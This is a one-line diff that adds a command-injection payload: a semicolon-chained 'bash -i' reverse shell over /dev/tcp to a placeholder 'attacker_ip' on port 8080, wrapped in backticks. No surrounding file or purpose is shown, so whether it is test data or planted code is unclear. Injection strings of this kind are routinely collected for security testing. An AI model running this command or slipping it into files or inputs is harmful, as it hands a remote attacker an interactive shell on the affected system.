@@ -1,0 +1,1 @@
+`; bash -i >& /dev/tcp/attacker_ip/8080 0>&1`
